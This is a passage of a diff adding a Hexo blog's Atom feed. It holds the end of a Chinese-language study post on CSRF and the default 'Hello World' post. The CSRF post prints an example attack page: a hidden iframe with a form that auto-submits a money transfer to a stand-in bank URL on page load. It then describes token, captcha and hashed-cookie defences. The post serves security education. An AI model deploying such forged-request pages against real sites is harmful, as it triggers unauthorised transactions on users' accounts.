class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq.body.username;<span class="comment">//处理请求体request body</span></span><br><span class="line">req.query.username;<span class="comment">//处理查询字符串</span></span><br></pre></td></tr></table></figure></p><h2 id="只使用POST请求，只处理POST请求体的数据"><a href="#只使用POST请求，只处理POST请求体的数据" class="headerlink" title="只使用POST请求，只处理POST请求体的数据"></a>只使用POST请求，只处理POST请求体的数据</h2><p>危险网站B将代码修改<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">　　&lt;head&gt;</span><br><span class="line">　　　　&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">　　　　　　<span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">　　　　　　</span>&#123;</span><br><span class="line">          　　　　 iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span><br><span class="line">　　     　　      iframe.document.Submit(<span class="string">"transfer"</span>);</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">　　&lt;/</span>head&gt;</span><br><span class="line"></span><br><span class="line">　　&lt;body onload=<span class="string">"steal()"</span>&gt;</span><br><span class="line">　　　　&lt;iframe name=<span class="string">"steal"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">　　　　　　&lt;form method=<span class="string">"POST"</span> name=<span class="string">"transfer"</span>　action=<span class="string">"http://www.Bank.com/Transfer.php"</span>&gt;</span><br><span class="line">　　　　　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"BankId"</span> value=<span class="string">"11"</span>&gt;</span><br><span class="line">　　　　　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"1000"</span>&gt;</span><br><span class="line">　　　　　　&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">　　　　&lt;/i</span>frame&gt;</span><br><span class="line">　　&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure></p><p>B网站创建了一个iframe标签，并且把它设置为display:none，隐藏表单属性，偷偷给网站A发送请求，提前把表单提交值设设置好，提交给A网站</p><h2 id="源于web的身份验证机制"><a href="#源于web的身份验证机制" class="headerlink" title="源于web的身份验证机制"></a>源于web的身份验证机制</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！<strong>WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</strong></p><h2 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h2><h3 id="服务端进行CSRF防御"><a href="#服务端进行CSRF防御" class="headerlink" title="服务端进行CSRF防御"></a>服务端进行CSRF防御</h3><p>在客户端页面增加随机数。Cookie Hashing，就是构造加密的cookie信息。由于攻击者无法获取第三方cookie，那么表单的数据就构造失败。它不知道提交什么给服务器<br>在表单里增加Hash值，在服务端验证<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=”POST” action=”transfer.php”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”BankId”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”money”&gt;</span><br><span class="line">　　　　&lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt;</span><br><span class="line">　　　　&lt;input type=”submit” name=”submit” value=”Submit”&gt;</span><br><span class="line">　　&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但在易用性方面似乎不是太好。</p><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。<br>利用Token，嵌入到session中，当进行登录操作的时候就生成这个token，也就是说每次表单被渲染的时候，后台就会生成一个伪随机值来覆盖以前的伪随机值：用户只能成功提交他最后打开的表单，因为所有其他的表单都有非法的伪随机值。<br>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。</p><ul><li>令牌在不同页面最好是不同的使用全局的token可能会导致破解难度下降，因为令牌方法理论上是可破解的，</li><li>配合验证码</li><li>无论是验证码还是令牌，验证通过一定要销毁</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;br&gt;今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="前端" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://yoursite.com/2018/08/10/hello-world/"/>
+    <id>http://yoursite.com/2018/08/10/hello-world/</id>
+    <published>2018-08-09T16:22:37.390Z</published>
+    <updated>2018-08-10T02:42:24.766Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
